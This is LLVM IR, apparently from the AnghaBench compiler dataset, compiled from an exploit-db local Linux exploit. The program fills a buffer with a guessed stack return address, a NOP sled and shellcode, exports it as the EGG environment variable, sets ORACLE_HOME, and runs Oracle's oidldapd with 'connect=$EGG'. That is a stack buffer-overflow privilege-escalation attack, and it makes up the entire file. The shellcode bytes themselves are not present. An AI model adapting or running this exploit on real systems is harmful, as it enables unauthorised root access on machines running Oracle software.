; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_20312.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_20312.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@DEFAULT_OFFSET = common dso_local global i32 0, align 4
@DEFAULT_BUFFER_SIZE = common dso_local global i32 0, align 4
@NOP = common dso_local global i8 0, align 1
@shellcode = common dso_local global i32* null, align 8
@.str = private unnamed_addr constant [5 x i8] c"EGG=\00", align 1
@.str.1 = private unnamed_addr constant [15 x i8] c"ORACLE_HOME=%s\00", align 1
@ORACLE_HOME = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [29 x i8] c"%s/bin/oidldapd connect=$EGG\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [3 x i8*], align 16
  %8 = alloca [100 x i8], align 16
  %9 = alloca [120 x i8], align 16
  %10 = alloca i64*, align 8
  %11 = alloca i64, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %15 = load i32, i32* @DEFAULT_OFFSET, align 4
  store i32 %15, i32* %12, align 4
  %16 = load i32, i32* @DEFAULT_BUFFER_SIZE, align 4
  store i32 %16, i32* %13, align 4
  %17 = load i32, i32* %13, align 4
  %18 = call i8* @malloc(i32 %17)
  store i8* %18, i8** %5, align 8
  %19 = call i32 (...) @get_sp()
  %20 = load i32, i32* %12, align 4
  %21 = sub nsw i32 %19, %20
  %22 = sext i32 %21 to i64
  store i64 %22, i64* %11, align 8
  %23 = load i8*, i8** %5, align 8
  store i8* %23, i8** %6, align 8
  %24 = load i8*, i8** %6, align 8
  %25 = bitcast i8* %24 to i64*
  store i64* %25, i64** %10, align 8
  store i32 0, i32* %14, align 4
  br label %26

26:                                               ; preds = %34, %2
  %27 = load i32, i32* %14, align 4
  %28 = load i32, i32* %13, align 4
  %29 = icmp slt i32 %27, %28
  br i1 %29, label %30, label %37

30:                                               ; preds = %26
  %31 = load i64, i64* %11, align 8
  %32 = load i64*, i64** %10, align 8
  %33 = getelementptr inbounds i64, i64* %32, i32 1
  store i64* %33, i64** %10, align 8
  store i64 %31, i64* %32, align 8
  br label %34

34:                                               ; preds = %30
  %35 = load i32, i32* %14, align 4
  %36 = add nsw i32 %35, 4
  store i32 %36, i32* %14, align 4
  br label %26

37:                                               ; preds = %26
  store i32 0, i32* %14, align 4
  br label %38

38:                                               ; preds = %49, %37
  %39 = load i32, i32* %14, align 4
  %40 = load i32, i32* %13, align 4
  %41 = sdiv i32 %40, 2
  %42 = icmp slt i32 %39, %41
  br i1 %42, label %43, label %52

43:                                               ; preds = %38
  %44 = load i8, i8* @NOP, align 1
  %45 = load i8*, i8** %5, align 8
  %46 = load i32, i32* %14, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds i8, i8* %45, i64 %47
  store i8 %44, i8* %48, align 1
  br label %49

49:                                               ; preds = %43
  %50 = load i32, i32* %14, align 4
  %51 = add nsw i32 %50, 1
  store i32 %51, i32* %14, align 4
  br label %38

52:                                               ; preds = %38
  %53 = load i8*, i8** %5, align 8
  %54 = load i32, i32* %13, align 4
  %55 = sdiv i32 %54, 2
  %56 = load i32*, i32** @shellcode, align 8
  %57 = call i32 @strlen(i32* %56)
  %58 = sdiv i32 %57, 2
  %59 = sub nsw i32 %55, %58
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds i8, i8* %53, i64 %60
  store i8* %61, i8** %6, align 8
  store i32 0, i32* %14, align 4
  br label %62

62:                                               ; preds = %76, %52
  %63 = load i32, i32* %14, align 4
  %64 = load i32*, i32** @shellcode, align 8
  %65 = call i32 @strlen(i32* %64)
  %66 = icmp slt i32 %63, %65
  br i1 %66, label %67, label %79

67:                                               ; preds = %62
  %68 = load i32*, i32** @shellcode, align 8
  %69 = load i32, i32* %14, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds i32, i32* %68, i64 %70
  %72 = load i32, i32* %71, align 4
  %73 = trunc i32 %72 to i8
  %74 = load i8*, i8** %6, align 8
  %75 = getelementptr inbounds i8, i8* %74, i32 1
  store i8* %75, i8** %6, align 8
  store i8 %73, i8* %74, align 1
  br label %76

76:                                               ; preds = %67
  %77 = load i32, i32* %14, align 4
  %78 = add nsw i32 %77, 1
  store i32 %78, i32* %14, align 4
  br label %62

79:                                               ; preds = %62
  %80 = load i8*, i8** %5, align 8
  %81 = load i32, i32* %13, align 4
  %82 = sub nsw i32 %81, 1
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds i8, i8* %80, i64 %83
  store i8 0, i8* %84, align 1
  %85 = load i8*, i8** %5, align 8
  %86 = call i32 @memcpy(i8* %85, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i32 4)
  %87 = load i8*, i8** %5, align 8
  %88 = call i32 @putenv(i8* %87)
  %89 = getelementptr inbounds [100 x i8], [100 x i8]* %8, i64 0, i64 0
  %90 = load i8*, i8** @ORACLE_HOME, align 8
  %91 = call i32 @sprintf(i8* %89, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.1, i64 0, i64 0), i8* %90)
  %92 = getelementptr inbounds [100 x i8], [100 x i8]* %8, i64 0, i64 0
  %93 = call i32 @putenv(i8* %92)
  %94 = getelementptr inbounds [120 x i8], [120 x i8]* %9, i64 0, i64 0
  %95 = load i8*, i8** @ORACLE_HOME, align 8
  %96 = call i32 @sprintf(i8* %94, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.2, i64 0, i64 0), i8* %95)
  %97 = getelementptr inbounds [120 x i8], [120 x i8]* %9, i64 0, i64 0
  %98 = call i32 @system(i8* %97)
  ret void
}

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @get_sp(...) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @putenv(i8*) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*) #1

declare dso_local i32 @system(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
